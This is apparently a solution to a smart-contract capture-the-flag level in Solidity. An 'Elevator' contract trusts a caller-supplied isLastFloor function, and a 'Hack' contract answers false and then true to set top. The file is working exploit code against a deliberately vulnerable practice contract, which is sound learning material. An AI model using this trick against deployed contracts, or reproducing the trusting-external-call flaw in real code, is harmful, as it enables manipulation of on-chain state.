// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Hack {
    Elevator public elevator;
    uint public lastFloor;

    constructor(Elevator _elevator) {
        elevator = _elevator;
    }

    function goToFloor(uint _floor) public {
        elevator.goTo(_floor);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if(lastFloor != _floor) {
            lastFloor = _floor;
            return false;
        }
        return true;
    }
}